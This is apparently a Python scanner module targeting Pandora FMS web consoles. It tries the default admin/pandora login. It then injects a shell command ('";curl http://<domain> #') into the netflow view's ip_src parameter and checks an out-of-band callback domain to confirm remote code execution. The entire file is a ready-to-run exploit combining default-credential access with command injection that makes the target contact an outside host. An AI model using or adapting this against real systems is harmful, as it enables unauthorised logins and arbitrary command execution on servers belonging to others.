import requests,re,urllib3,time
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'pandora_console/index.php?login=1'
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	body='nick=admin&pass=1234asd&unnamed=Login'
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if 'Login failed' in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+'pandora_console/index.php?login=1'
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	body='nick=admin&pass=pandora&unnamed=Login'
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if 'Login failed' not in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		denglu=True
		try:
			cookie=response.headers['Set-Cookie']
		except:
			cookie=''
	else:
		denglu=False
		cookie=''
	gets=get_domain()
	domain=gets[0]
	token=gets[1]
	url=baseurl+"pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0"
	body="date=0&time=0&period=0&interval_length=0&chart_type=netflow_area&max_aggregates=1&address_resolution=0&name=0&assign_group=0&filter_type=0&filter_id=0&filter_selected=0&ip_dst=0&ip_src=%22%3Bcurl+http://"+domain+"+%23&draw_button=Draw"
	headers={'Content-Type': 'application/x-www-form-urlencoded','Cookie': cookie}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	time.sleep(2)
	if response.status_code == 200 and get_result(domain,token):
		rce=True
	else:
		rce=False
	if denglu or rce:
		return True
	else:
		return False
